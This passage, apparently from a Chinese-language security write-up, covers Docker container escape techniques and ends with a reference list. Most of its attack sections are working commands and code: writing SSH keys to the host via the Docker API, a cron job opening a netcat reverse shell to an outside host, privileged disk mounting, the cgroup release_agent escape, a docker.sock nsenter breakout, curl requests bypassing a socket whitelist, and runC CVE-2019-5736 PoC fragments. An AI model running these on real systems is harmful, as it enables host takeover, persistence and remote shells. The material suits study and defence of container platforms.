    image = cli.images.list()[0]
    #读取生成的公钥
    f = open('id_rsa_2048.pub', 'r')
    sshKey = f.read()
    f.close()
    try:
        cli.containers.run(
            image=image.tags[0], 
            command='sh -c "echo '+sshKey+' >> /usr/games/authorized_keys"', #这里卡了很久，这是正确有效的写法，在有重定向时直接写命令是无法正确执行的，记得加上sh -c
            volumes={'/root/.ssh':{'bind': '/usr/games', 'mode': 'rw'}}, #找一个基本所有环境都有的目录
            name='test' #给容器命名，便于后面删除
        )
    except docker.errors.ContainerError as e:
        print(e)
    #删除容器
    try:
        container = cli.containers.get('test')
        container.remove()
    except Expection as e:
        continue
计划任务(by P牛)
    import docker
    client = docker.DockerClient(base_url='http://your-ip:2375/')
    data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
## 0x01.2 docker几个启动参数
以特权模式启动时，docker容器内拥有宿主机文件读写权限，可以通过写ssh密钥、计划任务等方式达到逃逸。
条件:
    以--privileged 参数启动docker container。
    获得docker container shell，比如通过蜜罐漏洞、业务漏洞等途径获得。
\--cap-add=SYS_ADMIN 启动时虽然有挂载权限，但没发直接获得资源去挂载，需要其他方法获得资源或其它思路才能利用。
\--net=host 启动时,绕过Network Namespace  
\--pid=host 启动时,绕过PID Namespace  
\--ipc=host 启动时,绕过IPC Namespace  
\--volume /:/host 挂载主机目录到container  
网络如果没其他配置，docker不添加网络限制参数，默认使用桥接网络，通过docker0可以访问host。
### \--privileged 利用
启动Docker容器。使用此参数时，容器可以完全访问所有设备，并且不受seccomp，AppArmor和Linux capabilities的限制。
    查看磁盘文件: fdisk -l
    新建目录以备挂载: mkdir /aa
    将宿主机/dev/sda1目录挂载至容器内 /aa: mount /dev/sda1 /aa
    即可写文件获取权限或数据
容器挂载宿主机目录，执行结果如下:  
### \--cap-add=SYS_ADMIN 利用
前提：
    在容器内root用户
    容器必须使用SYS_ADMIN Linux capability运行
    容器必须缺少AppArmor配置文件，否则将允许mount syscall
    cgroup v1虚拟文件系统必须以读写方式安装在容器内部
思路：  
我们需要一个cgroup，可以在其中写入notify_on_release文件(for enable cgroup
notifications)，挂载cgroup控制器并创建子cgroup，创建/bin/sh进程并将其PID写入cgroup.procs文件，sh退出后执行release_agent文件。
步骤
    # On the host
    docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
    # In the container
    mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
    echo 1 > /tmp/cgrp/x/notify_on_release
    host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
    echo "$host_path/cmd" > /tmp/cgrp/release_agent
    echo '#!/bin/sh' > /cmd
    echo "ls > $host_path/output" >> /cmd
    chmod a+x /cmd
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
写入output文件到宿主机截图如下  
## 0x01.3 docker.sock暴露到容器内部
容器内部可以与docker deamon通信  
Command: `sudo docker -H unix:///google/host/var/run/docker.sock run -it
--privileged --pid=host debian nsenter -t 1 -m -u -n -i sh`  
  * 案例:  
## 0x01.4 docker.sock 配置白名单绕过
### 架构
    /var/run/docker.sock is not exposed within the docker containers anymore. It is readable and writable only for the “root” user and the “docker” group. As you already know the docker engine uses it directly.
    /var/run/somethingelse.sock is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “/var/run/docker.sock”. The docker engine remains the only one able to do that.
用户请求
"/var/run/somethingelse.sock"，经由反向代理，将这些请求转发到"/var/run/docker.sock"。反向代理根据预先保存在配置文件中的授权值白名单来决定是否请求"/var/run/docker.sock"。例如，只有当一个请求符合特定的HTTP方法(GET、POST等......)、路径(例如"/containers/create")和/或JSON体时，才可以让其通过。
### 利用
挂载目录  
白名单在验证`/dev/log:/dev/log`时通过  
传递多个`"Binds": ["/:/hostos", "/dev/log:/dev/log"]`挂载目录即可挂载成功
执行命令  
执行/containers/{id}/exec时拦截  
使用attach绕过  
curl -i -s --unix-socket /var/run/somethingelse.sock -X POST
“[http://localhost/containers/4fa6bfc84930/attach?logs=1&stream=1&stdin=true&stdout=true&stderr=true”](http://localhost/containers/4fa6bfc84930/attach?logs=1&stream=1&stdin=true&stdout=true&stderr=true”)
挂载目录获取root权限  
使用Docker API Cmd参数,不使用Entrypoint参数
    curl -i -s --unix-socket /var/run/somethingelse.sock -X POST -H 'Content-Type: application/json' --data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true, "Tty": true,"OpenStdin": true, "StdinOnce": true,"Entrypoint": "","Cmd": ["touch", "/hostos/root/1.txt"],"Image": "dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT","Volumes": {"/hostos/": {}}, "HostConfig": {"Binds": ["/:/hostos", "/dev/log:/dev/log"], "Privileged": true}}' http://localhost/containers/create
# 0x02 容器服务缺陷
## 0x02.1 runC cve-2019-5736
1.关于runC  
runC 管理容器的创建，运行，销毁等。  
Docker 运行时通常会实现镜像创建和管理等功能。
runC官方功能描述如下  
2.影响版本
平台或产品 | 受影响版本  
---|---  
Docker | Version 
### 利用方法一 Docker EXEC POC
  * 
循环等待 runC init的 PID -> open("/proc/pid/exe"，O_RDONLY) -> execve()释放
runC的IO并覆盖runC二进制文件 -> execve()执行被覆盖 runC
### 利用方法二 恶意镜像POC
  * 
思路: 研究人员通过欺骗runC init execve -> runc 执行/proc/self/exe -> /proc/[runc-pid]/exe覆盖runC 二进制文件
POC文件分析
> Dockerfile文件
1.获取libseccomp文件并将run_at_link文件加入，runC启动运行libseccomp。
    ADD run_at_link.c /root/run_at_link.c
    RUN set -e -x ;\
        cd /root/libseccomp-* ;\
        cat /root/run_at_link.c >> src/api.c ;\
        DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
        dpkg -i /root/*.deb
2.overwrite_runc添加docker中并编译  
3.使入口点指向runc
    RUN set -e -x ;\
        ln -s /proc/self/exe /entrypoint
    ENTRYPOINT [ "/entrypoint" ]
> run_at_link文件
1.run_at_link read runc binary 获得fd
    int runc_fd_read = open("/proc/self/exe", O_RDONLY);
        if (runc_fd_read == -1 ) {
            printf("[!] can't open /proc/self/exe\n");
            return;
        }
        printf("[+] Opened runC for reading as /proc/self/fd/%d\n", runc_fd_read);
        fflush(stdout);
2.调用execve执行overwrite_runc
    execve("/overwrite_runc", argv_overwrite, NULL);
3.overwrite_runc写入poc string
## 0x02.2 Docker cp (CVE-2019-14271)
  * 
## 0x02.3 Docker build code execution CVE-2019-13139
  * 
# 0x03 内核提权
## 0x03.1 Dirty cow
对于由内核漏洞引起的漏洞，其实主要流程如下：
  1. 使用内核漏洞进入内核上下文 
  2. 获取当前进程的task struct 
  3. 回溯 task list 获取 pid = 1 的 task struct，复制其相关数据 
  4. 切换当前 namespace 
  5. 打开 root shell，完成逃逸
    （一）脏牛漏洞(CVE-2016-5195)与VDSO(虚拟动态共享对象)
    Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。
    竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。
    在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。
# 0x04 针对个人攻击思路
@chernymi 在 Blackhat 分享了针对个人攻击链  
触发链接 -> 绕SOP(DNS Rebinding || Host Rebinding) -> Pull Image -> Run Contain ->
Persistent
这块内容待补充
# 0x05 参考
  * vulhub
  * [exposing-docker.sock](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
  * [docker API未授权访问漏洞分析和利用](https://wooyun.js.org/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8.html)
  * [Docker逃逸初探](https://www.anquanke.com/post/id/179623)
  * [容器逃逸方法](https://www.cdxy.me/?p=818) -by cdxy
  * [关于 Docker Remote API未授权访问 的一些研究](https://seaii-blog.com/index.php/2017/01/31/26.html)
  * [understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
  * [google-cloud-shell-bugs](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-2/)
  * [abusing-insecure-docker-deployments](https://strm.sh/post/abusing-insecure-docker-deployments/)
  * [cgroups](http://man7.org/linux/man-pages/man7/cgroups.7.html)
  * [Container security notes](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)
  * [Linux Namespace 1](https://coolshell.cn/articles/17010.html) -by 左耳朵耗子
  * [Linux Namespace 2](https://coolshell.cn/articles/17029.html) -by 左耳朵耗子
  * [AUFS](https://coolshell.cn/articles/17061.html) -by 左耳朵耗子
  * [CVE-2019-5736 Docker逃逸](https://bestwing.me/CVE-2019-5736-Docker-escape.html) -by swing
  * [runC容器逃逸漏洞分析](https://www.4hou.com/posts/K6EG)
  * [探究runC容器逃逸](http://wiki.m4p1e.com/article/getById/57#)
  * [CVE-2019-5736 docker escape 漏洞复现](https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html)
  * [Blackhat-How-Abusing-The-Docker-API-Led-To-Remote-Code-Execution-Same-Origin-Bypass-And-Persistence](https://www.blackhat.com/docs/us-17/thursday/us-17-Cherny-Well-That-Escalated-Quickly-How-Abusing-The-Docker-API-Led-To-Remote-Code-Execution-Same-Origin-Bypass-And-Persistence.pdf) -by @chernymi
  * [Blackhat-How-Abusing-The-Docker-API-Led-To-Remote-Code-Execution-Same-Origin-Bypass-And-Persistence.video](https://www.youtube.com/watch?v=w7tAfIlMIa0)
  * [Breaking-docker-via-runc-explaining-cve-2019-5736](https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/)
  * [runc 启动容器过程分析](https://imkira.com/runc/) -by WEI GUO
  * namespace与沙箱安全 -by explorer
  * Docker逃逸-从一个进程崩溃讲起 -by 卢宇
  * [Docker容器安全性分析](https://www.freebuf.com/articles/system/221319.html)
  * [Docker cp命令漏洞分析](https://www.anquanke.com/post/id/193218)
  * [Docker-docs](https://docs.docker.com/engine/reference/commandline/run/)
  * [Compendium-Of-Container-Escapes-up.pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf) -by Blackhat Edwards
  * [Compendium-Of-Container-Escapes-up.video](https://www.youtube.com/watch?v=BQlqita2D2s) -by Blackhat Edwards
  * [容器标准化](https://www.myway5.com/index.php/2019/11/04/%E5%AE%B9%E5%99%A8%E6%A0%87%E5%87%86%E5%8C%96/)
  * [gVisor runsc guest->host breakout via filesystem cache desync](https://bugs.chromium.org/p/project-zero/issues/detail?id=1631) google开发的功能类似runc
  * [exploration-of-security-when-building-docker-containers](https://blog.heroku.com/exploration-of-security-when-building-docker-containers)
  * [云原生之容器安全实践](https://tech.meituan.com/2020/03/12/cloud-native-security.html)
  * [A Tale of Escaping a Hardened Docker container](https://www.redtimmy.com/docker/a-tale-of-escaping-a-hardened-docker-container/)
  * [针对容器的渗透测试方法](https://cloud.tencent.com/developer/article/1621185)
  * [针对Docker容器网络的ARP欺骗与中间人攻击](https://github.com/knownsec/KCon/blob/master/2019/25%E6%97%A5/%E9%92%88%E5%AF%B9Docker%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E7%9A%84ARP%E6%AC%BA%E9%AA%97%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.pdf)
  * [tom0li:collection-document](https://github.com/tom0li/collection-document)